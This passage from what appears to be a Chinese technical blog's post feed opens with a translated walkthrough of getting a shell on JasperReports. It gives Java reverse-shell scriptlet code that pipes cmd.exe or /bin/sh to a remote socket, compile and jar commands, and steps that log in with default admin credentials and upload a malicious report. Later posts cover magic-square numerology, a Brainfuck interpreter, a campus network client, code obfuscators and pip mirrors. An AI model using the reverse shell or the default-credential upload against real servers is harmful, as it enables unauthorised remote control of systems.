rt.exec(<span class="string">"C:\\Windows\\System32\\cmd.exe"</span>);</div><div class="line">         <span class="keyword">else</span> p = rt.exec(<span class="string">"/bin/sh"</span>);</div><div class="line"> </div><div class="line">         InputStream readme = p.getInputStream();</div><div class="line">         OutputStream writeme = p.getOutputStream();</div><div class="line">         commandWrite = <span class="keyword">new</span> PrintWriter(writeme);</div><div class="line">         commandRead = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(readme));</div><div class="line"> </div><div class="line">         <span class="keyword">if</span>(windows) commandWrite.println(<span class="string">"dir"</span>);</div><div class="line">         <span class="keyword">else</span> commandWrite.println(<span class="string">"ls -al"</span>);</div><div class="line"> </div><div class="line">         commandWrite.flush();</div><div class="line"> </div><div class="line">         String line;</div><div class="line">         <span class="keyword">while</span>((line = commandRead.readLine()) != <span class="keyword">null</span>)&#123;</div><div class="line">            socketWrite.println(line);</div><div class="line">            socketWrite.flush();</div><div class="line">         &#125;</div><div class="line"> </div><div class="line">         p.destroy();</div><div class="line"> </div><div class="line">      &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</div><div class="line"> </div><div class="line">   &#125;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">establishConnection</span><span class="params">()</span></span>&#123;</div><div class="line">      <span class="keyword">try</span>&#123;</div><div class="line">         socket = <span class="keyword">new</span> Socket(ip,port);</div><div class="line">         socketWrite = <span class="keyword">new</span> PrintWriter(socket.getOutputStream(),<span class="keyword">true</span>);</div><div class="line">         socketRead = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(socket.getInputStream()));</div><div class="line">         socketWrite.println(<span class="string">"---Connection has been established---"</span>);</div><div class="line">         socketWrite.flush();</div><div class="line">      &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</div><div class="line"> </div><div class="line">   &#125;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getCommand</span><span class="params">()</span></span>&#123;</div><div class="line">      String foo;</div><div class="line"> </div><div class="line">      <span class="keyword">try</span>&#123;</div><div class="line">         <span class="keyword">while</span>((foo=socketRead.readLine())!= <span class="keyword">null</span>)&#123;</div><div class="line">            commandWrite.println(foo);</div><div class="line">            commandWrite.flush();</div><div class="line">         &#125;</div><div class="line">      &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</div><div class="line">   &#125;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</div><div class="line">      ShellScriptlet r = <span class="keyword">new</span> ShellScriptlet();</div><div class="line">      r.getShell();</div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>对于那些不熟悉Java的,你可以用下面的命令编译在相同的目录中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/lib/jvm/java-6-openjdk-amd64/bin/javac -Xlint -cp .:jasperreports-5.0.0.jar *.java -d .</div></pre></td></tr></table></figure><p>这里指定” javac “的完整路径是有原因的(这是Java 1.6)。如果你运行这个命令对某种系统会出错,你需要考虑理想情况下用相同的环境来编译它，至少不是最新的版本！</p><p>接下来我们要做的就是把所有的代码打包趁有个jar文件然后上传到目标站点。你可以使用下面这个代码来完成它：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/lib/jvm/java-6-openjdk-amd64/bin/jar cvf shell.jar foxglove/</div></pre></td></tr></table></figure><p>如果一切进行的顺利，你就会得到个“shell.jar”文件，接下来就准备上传这个到目标站点吧！</p><h4 id="部署这个新的“Report”"><a href="#部署这个新的“Report”" class="headerlink" title="部署这个新的“Report”"></a>部署这个新的“Report”</h4><p>每个版本的JasperReports似乎都有些不同，但是他们都有相同的函数和工作流。</p><p>首先很明显我们要去验证一下“jasperadmin/jasperadmin”：<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/authd.png?w=960" alt="authd.png"></p><p>在我这个版本中，这就立即显示出了有一堆reports样例的“Repository”（要确保“Type”这一列说的是“Report”）。</p><p>接下来，我们只要右击一个report并且点击“Edit”就好。</p><p>一开始，就点击 “Controls and Resources” 之后点击“Add Resource”。上传我们之前创建的JAR文件并给这个资源命名为“ShellScriptlet”。结束之后我们应该可以看到下图这样的结果：<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/resource.png?w=960" alt="resource.png"></p><p>点击左侧栏的“Set Up”，单击 “Upload a Local file”把我们之前创建的JRXML文件上传了。你应该可以得到下图所示的结果：<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/resources2.png?w=960" alt="resources2"></p><p>Jasper 现在让我们去定义一些我们在JRXML文件引用的资源。如果你是一个keener你可能会仅仅把这些资源从JRXML文件中删除。仅仅单击“Add Now”并且上传一些随机的PNG图片文件为你每一个引用资源…当你做完这些应该看起来像下图一样：<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/resourcesadded.png?w=960" alt="resourcesadded"></p><p>现在你只需要点击“Submit”在这个按钮来创建我们的恶意report就好了。哈哈</p><h4 id="Shellz"><a href="#Shellz" class="headerlink" title="Shellz!"></a>Shellz!</h4><p>先别激动，在你运行这个report之前，你还要开个监听端口去捕捉你的shell！！！<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/listener.png?w=960" alt="listener.png"></p><p>之后单击你创建的report，它将会运行Java代码，如果没有什么问题，你就可以看到反弹的shell了。</p><p><img src="https://foxglovesecurity.files.wordpress.com/2016/10/shell1.png?w=960" alt="shell"></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>洛书中的数字规律</title>
      <link href="/2017/01/22/%E6%B4%9B%E4%B9%A6%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%A7%84%E5%BE%8B/"/>
      <url>/2017/01/22/%E6%B4%9B%E4%B9%A6%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%A7%84%E5%BE%8B/</url>
      <content type="html"><![CDATA[<p><img src="http://ok44mzy2k.bkt.clouddn.com/luoshu-1.png" alt="1"></p><h2 id="数字规律"><a href="#数字规律" class="headerlink" title="数字规律"></a>数字规律</h2><p><a href="undefined">编辑</a></p><p>那么<a href="http://baike.baidu.com/view/102528.htm" target="_blank" rel="external">河图洛书</a>中真的隐含着宇宙之理吗？其内容又是什么呢？我在这里只能先谈洛书，即<a href="http://baike.baidu.com/view/97444.htm" target="_blank" rel="external">九宫图</a>。把九宫图中的数字排列来进行详解一番，或可看出一定道理来。首先在九宫图中数字之和等于十五，这一点恐怕所有的人都知道，就是横坚斜相加都等于十五。</p><p>4+9+2=15</p><p>3+5+7=15</p><p>8+1+6=15</p><p>4+3+8=15</p><p>9+5+1=15</p><p>2+7+6=15</p><p>4+5+6=15</p><p>2+5+8=15</p><p>除此之外，还有什么数字玄机呢？</p><p>a+b+c=d+e+f</p><p>a^2+b^2+c^2=d^2+e^2+f^2</p><p>我们以左列的438与右列的276为例加以说明。当我们把数递变为两位数相加时，左右两列数字之和依然相等。即43+38+84=27+76+62。从下向上递变依然成立。即83+34+48=67+72+26。</p><p>递变为三位数依然相等，即438+384+843=276+762+627。</p><p>从下向上递数依然成立，即834+348+483=672+726+267。</p><p>再这样递变下去为四位数、五位数、六位数，一百位数、一千位数依然成立。神奇之处还不在这里，更为神奇的是不管是一位，还是两位数三位数的平方相加和依然可以左右相等。比如两位数即43^2+38^2+84^2=27^2+76^2+62^2。</p><p>三位数四位数平方和依然可以成立。也就是说一百位也好一千位也好都可以成立。这个数字的神奇排列真是让我莫名惊诧。</p><p>再有就是把九宫图用行列式的方法计算，可以得到一个周天数360。在这些数字面前，我不敢想象，这样一个数字排竟然有着不可思议的魔力。</p><p>det[4 ，9， 2；3，5，7；8，1，6]=360</p><p>就是这样的一个九宫数的排列解开了美国数学家提出的数学怪题，严格等平方和的问题，当时可是无人能解的数学怪题，就连计算机都无能为力。结果被研究洛书的彭绍定数学教授攻克。</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Brainfuck</title>
      <link href="/2017/01/22/Brainfuck/"/>
      <url>/2017/01/22/Brainfuck/</url>
      <content type="html"><![CDATA[<p>一些隐写题中可能会出此现这种东西，下面我来大概介绍一下：</p><p>官方网站: <a href="http://www.muppetlabs.com/~breadbox/bf/" target="_blank" rel="external">http://www.muppetlabs.com/~breadbox/bf/</a></p><p>BrainFuck, (An Eight-Instruction Turing-Complete Programming Language), 这个语言本身的语言模型很简单, 有一个byte指针, 有一个初始化为0长度为30000 bytes的数组, byte指针可以在数组内任意移动, 支持下面的八种操作, 指针初始化指向数组的开始. 这个语言只是作者为了写一个很简单的编译器, 才设计的一门语言, 语言和名字一样, 很难读懂, 简单的一些操作用BrainFuck来写都很复杂难读.</p><p>八种操作符定义如下:</p><table><thead><tr><th>字符</th><th>含义</th></tr></thead><tbody><tr><td>&gt;</td><td>指针加一</td></tr><tr><td>&lt;</td><td>指针减一</td></tr><tr><td>+</td><td>指针指向的字节的值加一</td></tr><tr><td>-</td><td>指针指向的字节的值减一</td></tr><tr><td>.</td><td>输出指针指向的单元内容（ASCII码）</td></tr><tr><td>,</td><td>输入内容到指针指向的单元（ASCII码）</td></tr><tr><td>[</td><td>如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处</td></tr><tr><td>]</td><td>如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处</td></tr></tbody></table><p>Brainfuck程序可以用下面的替换方法翻译成C语言(假设ptr是char*类型)：</p><table><thead><tr><th>Brainfuck</th><th>C</th></tr></thead><tbody><tr><td>&gt;</td><td>++ptr;</td></tr><tr><td>&lt;</td><td>–ptr;</td></tr><tr><td>+</td><td>++*ptr;</td></tr><tr><td>-</td><td>–*ptr;</td></tr><tr><td>.</td><td>putchar(*ptr);</td></tr><tr><td>,</td><td>*ptr =getchar();</td></tr><tr><td>[</td><td>while (*ptr) {</td></tr><tr><td>]</td><td>}</td></tr></tbody></table><p>举个例子：</p><p><code>++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;++.&gt;+.+++++++..+++.&lt;&lt;++.&gt;+++++++++++++++.&gt;.+++.------.--------.&lt;&lt;+.&lt;.</code></p><p>这个编译后就是  ‘Hello World!’</p><p>其实只要工具就好了！！！<br>贴一个python实现的解释器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os </div><div class="line"><span class="keyword">import</span> sys </div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">mainloop</span><span class="params">(program, bracket_map)</span>:</span> </div><div class="line">    pc = <span class="number">0</span> </div><div class="line">    tape = Tape() </div><div class="line">    <span class="keyword">while</span> pc &lt; len(program): </div><div class="line">        code = program[pc] </div><div class="line">        <span class="keyword">if</span> code == <span class="string">"&gt;"</span>: </div><div class="line">            tape.advance() </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"&lt;"</span>: </div><div class="line">            tape.devance() </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"+"</span>: </div><div class="line">            tape.inc() </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"-"</span>: </div><div class="line">            tape.dec() </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"."</span>: </div><div class="line">            <span class="comment"># print </span></div><div class="line">            os.write(<span class="number">1</span>, chr(tape.get())) </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">","</span>: </div><div class="line">            <span class="comment"># read from stdin </span></div><div class="line">            tape.set(ord(os.read(<span class="number">0</span>, <span class="number">1</span>)[<span class="number">0</span>])) </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"["</span> <span class="keyword">and</span> tape.get() == <span class="number">0</span>: </div><div class="line">            <span class="comment"># Skip forward to the matching ] </span></div><div class="line">            pc = bracket_map[pc] </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"]"</span> <span class="keyword">and</span> tape.get() != <span class="number">0</span>: </div><div class="line">            <span class="comment"># Skip back to the matching [ </span></div><div class="line">            pc = bracket_map[pc] </div><div class="line">        pc += <span class="number">1</span> </div><div class="line"> </div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tape</span><span class="params">(object)</span>:</span> </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span> </div><div class="line">        self.thetape = [<span class="number">0</span>] </div><div class="line">        self.position = <span class="number">0</span> </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span> </div><div class="line">        <span class="keyword">return</span> self.thetape[self.position] </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(self, val)</span>:</span> </div><div class="line">        self.thetape[self.position] = val </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inc</span><span class="params">(self)</span>:</span> </div><div class="line">        self.thetape[self.position] += <span class="number">1</span> </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(self)</span>:</span> </div><div class="line">        self.thetape[self.position] -= <span class="number">1</span> </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">advance</span><span class="params">(self)</span>:</span> </div><div class="line">        self.position += <span class="number">1</span> </div><div class="line">        <span class="keyword">if</span> len(self.thetape) &lt;= self.position: </div><div class="line">            self.thetape.append(<span class="number">0</span>) </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">devance</span><span class="params">(self)</span>:</span> </div><div class="line">        self.position -= <span class="number">1</span> </div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(program)</span>:</span> </div><div class="line">    parsed = [] </div><div class="line">    bracket_map = &#123;&#125; </div><div class="line">    leftstack = [] </div><div class="line">    pc = <span class="number">0</span> </div><div class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> program: </div><div class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> (<span class="string">'['</span>, <span class="string">']'</span>, <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>, <span class="string">'+'</span>, <span class="string">'-'</span>, <span class="string">','</span>, <span class="string">'.'</span>): </div><div class="line">            parsed.append(char) </div><div class="line">            <span class="keyword">if</span> char == <span class="string">'['</span>: </div><div class="line">                leftstack.append(pc) </div><div class="line">            <span class="keyword">elif</span> char == <span class="string">']'</span>: </div><div class="line">                left = leftstack.pop() </div><div class="line">                right = pc </div><div class="line">                bracket_map[left] = right </div><div class="line">                bracket_map[right] = left </div><div class="line">            pc += <span class="number">1</span> </div><div class="line">     </div><div class="line">    <span class="keyword">return</span> <span class="string">""</span>.join(parsed), bracket_map </div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(fp)</span>:</span> </div><div class="line">    program_contents = <span class="string">""</span> </div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>: </div><div class="line">        read = os.read(fp, <span class="number">4096</span>) </div><div class="line">        <span class="keyword">if</span> len(read) == <span class="number">0</span>: </div><div class="line">            <span class="keyword">break</span> </div><div class="line">        program_contents += read </div><div class="line">    os.close(fp) </div><div class="line">    program, bm = parse(program_contents) </div><div class="line">    mainloop(program, bm) </div><div class="line">     </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </div><div class="line">    run(os.open(sys.argv[<span class="number">1</span>], os.O_RDONLY, <span class="number">0777</span>))</div><div class="line"></div><div class="line"><span class="comment">#用法：python brain.py flag.br</span></div><div class="line"><span class="comment">#在.br文件中保存BrainFuck的代码</span></div></pre></td></tr></table></figure><p>c编写的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">include &lt;stdio.h&gt;;</div><div class="line"><span class="keyword">int</span>  p, r, q;</div><div class="line"><span class="keyword">char</span> a[<span class="number">5000</span>], f[<span class="number">5000</span>], b, o, *s=f;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">interpret</span><span class="params">(<span class="keyword">char</span> *c)</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">char</span> *d;</div><div class="line">        r++;</div><div class="line">        <span class="keyword">while</span>( *c ) &#123;</div><div class="line">                <span class="keyword">switch</span>(o=<span class="number">1</span>,*c++) &#123;</div><div class="line">                <span class="keyword">case</span> <span class="string">'&lt;'</span>: p--;        <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'&gt;'</span>: p++;        <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'+'</span>: a[p]++;     <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'-'</span>: a[p]--;     <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'.'</span>: <span class="built_in">putchar</span>(a[p]); fflush(<span class="built_in">stdout</span>); <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">','</span>: a[p]=getchar();fflush(<span class="built_in">stdout</span>); <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'['</span>:</div><div class="line">                        <span class="keyword">for</span>( b=<span class="number">1</span>,d=c; b &amp;&amp; *c; c++ )</div><div class="line">                                b+=*c==<span class="string">'['</span>, b-=*c==<span class="string">']'</span>;</div><div class="line">                        <span class="keyword">if</span>(!b) &#123;</div><div class="line">                                c[<span class="number">-1</span>]=<span class="number">0</span>;</div><div class="line">                                <span class="keyword">while</span>( a[p] )</div><div class="line">                                        interpret(d);</div><div class="line">                                c[<span class="number">-1</span>]=<span class="string">']'</span>;</div><div class="line">                                <span class="keyword">break</span>;</div><div class="line">                        &#125;</div><div class="line">                <span class="keyword">case</span> <span class="string">']'</span>:</div><div class="line">                        <span class="built_in">puts</span>(<span class="string">"UNBALANCED BRACKETS"</span>), <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">                <span class="keyword">case</span> <span class="string">'#'</span>:</div><div class="line">                        <span class="keyword">if</span>(q&gt;<span class="number">2</span>)</div><div class="line">                                <span class="built_in">printf</span>(<span class="string">"%2d %2d %2d %2d %2d %2d %2d %2d %2d %2d/n%*s/n"</span>,</div><div class="line">                                       *a,a[<span class="number">1</span>],a[<span class="number">2</span>],a[<span class="number">3</span>],a[<span class="number">4</span>],a[<span class="number">5</span>],a[<span class="number">6</span>],a[<span class="number">7</span>],a[<span class="number">8</span>],a[<span class="number">9</span>],<span class="number">3</span>*p+<span class="number">2</span>,<span class="string">"^"</span>);</div><div class="line">                        <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">default</span>: o=<span class="number">0</span>;</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">if</span>( p&lt;<span class="number">0</span> || p&gt;<span class="number">100</span>)</div><div class="line">                        <span class="built_in">puts</span>(<span class="string">"RANGE ERROR"</span>), <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">        &#125;</div><div class="line">        r--;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></div><div class="line">&#123;</div><div class="line">        FILE *z;</div><div class="line">        q=argc;</div><div class="line">         <span class="keyword">if</span>(z=fopen(argv[<span class="number">1</span>],<span class="string">"r"</span>)) &#123;</div><div class="line">                <span class="keyword">while</span>( (b=getc(z))&gt;<span class="number">0</span> )</div><div class="line">                        *s++=b;</div><div class="line">                *s=<span class="number">0</span>;</div><div class="line">                interpret(f);</div><div class="line">        &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>编译一下就可以用了。</p><p>嗯，就这些。</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Linux下使用锐捷的方法</title>
      <link href="/2017/01/22/Linux%E4%B8%8B%E4%BD%BF%E7%94%A8%E9%94%90%E6%8D%B7%E7%9A%84%E6%96%B9%E6%B3%95/"/>
      <url>/2017/01/22/Linux%E4%B8%8B%E4%BD%BF%E7%94%A8%E9%94%90%E6%8D%B7%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<p>其实很简单一个命令就搞定（前提是你有这个<a href="https://pan.baidu.com/s/1bo13wYF" target="_blank" rel="external">脚本</a>）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#下载之后先解压：</div><div class="line"></div><div class="line">unzip RuijieForLinux.zip</div><div class="line"></div><div class="line">#之后cd 进去</div><div class="line"></div><div class="line">#在然后呢</div><div class="line"></div><div class="line">sudo chmod +x ./rjsupplicant.sh</div><div class="line"></div><div class="line">#再然后呢</div><div class="line"></div><div class="line">sudo ./rjsupplicant.sh -u 你的学号 -p 你的密码 -s 收费资源/免费资源</div></pre></td></tr></table></figure><p>第一次使用时，可以通过 –help命令查看使用帮助文档</p><p>贴个效果图：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/linux-rj.png" alt="1"></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>CTF中那些有趣的混淆</title>
      <link href="/2017/01/22/CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E6%B7%B7%E6%B7%86/"/>
      <url>/2017/01/22/CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E6%B7%B7%E6%B7%86/</url>
      <content type="html"><![CDATA[<p>​    ppencode/rrencode/jjencode/aaencode是Perl、Ruby、Javascript的小工具，可以将各自的代码进行混淆，转换成特殊字符，甚至还可以转换成有意思的表情。</p><h4 id="ppencode-Perl"><a href="#ppencode-Perl" class="headerlink" title="ppencode-Perl"></a>ppencode-Perl</h4><p>台湾的Perl达人<a href="http://pugs.blogs.com/" target="_blank" rel="external">唐鳳</a>在<a href="http://yapcasia.org/2010/" target="_blank" rel="external">YAPC</a>曾经介绍过<a href="http://www.slideshare.net/autang/ppencode" target="_blank" rel="external">ppencode</a>，它可以把Perl代码转换成只有英文字母的字符串。</p><p>下面是转换示例：</p><p>Demo的地址：<a href="http://namazu.org/~takesako/ppencode/demo.html" target="_blank" rel="external">http://namazu.org/~takesako/ppencode/demo.html</a>。</p><h4 id="rrencode-Ruby"><a href="#rrencode-Ruby" class="headerlink" title="rrencode-Ruby"></a>rrencode-Ruby</h4><p>rrencode可以把ruby代码全部转换成符号。</p><p>下面是转换示例：</p><p>项目地址：<a href="http://www.lab2.kuis.kyoto-u.ac.jp/~yyoshida/rrencode.html" target="_blank" rel="external">http://www.lab2.kuis.kyoto-u.ac.jp/~yyoshida/rrencode.html</a>。</p><h4 id="jjencode-aaencode-Javascript"><a href="#jjencode-aaencode-Javascript" class="headerlink" title="jjencode/aaencode-Javascript"></a>jjencode/aaencode-Javascript</h4><p><a href="http://utf-8.jp/public/jjencode.html" target="_blank" rel="external">jjencode</a>和aaencode都是<a href="http://twitter.com/#!/hasegawayosuke" target="_blank" rel="external">Yosuke HASEGAWA</a>的作品，前者将JS代码转换成只有符号的字符串，类似于rrencode，介绍的PPT见<a href="http://utf-8.jp/public/20090710/jjencode.pps" target="_blank" rel="external">http://utf-8.jp/public/20090710/jjencode.pps</a>。</p><p>后者更好玩，可以将JS代码转换成常用的网络表情，例如“(ﾟΘﾟ)”。示例如下：</p><p>Demo的地址是：<a href="http://utf-8.jp/public/aaencode.html" target="_blank" rel="external">http://utf-8.jp/public/aaencode.html</a>，转换的代码并不复杂，可以在源代码里看到。</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>pip源的修改</title>
      <link href="/2017/01/22/pip%E6%BA%90%E7%9A%84%E4%BF%AE%E6%94%B9/"/>
      <url>/2017/01/22/pip%E6%BA%90%E7%9A%84%E4%BF%AE%E6%94%B9/</url>
      <content type="html"><![CDATA[<h4 id="1-在windows环境下修改pip镜像源的方法-以python3-5为例"><a href="#1-在windows环境下修改pip镜像源的方法-以python3-5为例" class="headerlink" title="1:在windows环境下修改pip镜像源的方法(以python3.5为例):"></a>1:在windows环境下修改pip镜像源的方法(以python3.5为例):</h4><p>(1):在windows文件管理器中,输入 %APPDATA%</p><p>(2):会定位到一个新的目录下，在该目录下新建pip文件夹，然后到pip文件夹里面去新建个pip.ini文</p><p>(3):在新建的pip.ini文件中输入以下内容，搞定</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[global]</div><div class="line">timeout = 6000</div><div class="line">index-url = http://pypi.douban.com/simple</div><div class="line">trusted-host = pypi.douban.com</div></pre></td></tr></table></figure><h4 id="2：在linux系统中更新pip源的方式-以centos-python2-7为例"><a href="#2：在linux系统中更新pip源的方式-以centos-python2-7为例" class="headerlink" title="2：在linux系统中更新pip源的方式(以centos,python2.7为例)"></a>2：在linux系统中更新pip源的方式(以centos,python2.7为例)</h4><p>在linux环境下的修改方式和在windows环境下修改方式基本相同，这里简单总结一下:</p><p>(1):在用户的家目录下面创建名为.pip文件夹</p><p>(2):在创建好的.pip文件夹中创建名为pip.conf的文件</p><p>(3):在pip.conf文件中输入以下内容，ok!!!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[global]</div><div class="line">timeout = 6000</div><div class="line">index-url = http://pypi.douban.com/simple</div><div class="line">trusted-host = pypi.douban.com</div></pre></td></tr></table></figure><h4 id="3：macOS更改pip源"><a href="#3：macOS更改pip源" class="headerlink" title="3：macOS更改pip源"></a>3：macOS更改pip源</h4><p>在终端进入目录：<code>cd ~/</code></p><p>如果没有 .pip 文件夹，那么就要新建这个文件夹，<code>mkdir .pip</code></p><p>然后在.pip 文件夹内<code>vim pip.conf</code>，</p><p>写入阿里云</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[global]</div><div class="line"></div><div class="line">index-url = http://mirrors.aliyun.com/pypi/simple/</div><div class="line"></div><div class="line">[install]</div><div class="line"></div><div class="line">trusted-host=mirrors.aliyun.com</div></pre></td></tr></table></figure><p>或者可以使用豆瓣的镜像：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[global]</div><div class="line"></div><div class="line">index-url = http://pypi.douban.com/simple</div><div class="line"></div><div class="line">[install]</div><div class="line"></div><div class="line">trusted-host=pypi.douban.com</div></pre></td></tr></table></figure><p>好了现在你可以体验快的飞起的pip了。</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>你会用你的虚拟机吗?(一)</title>
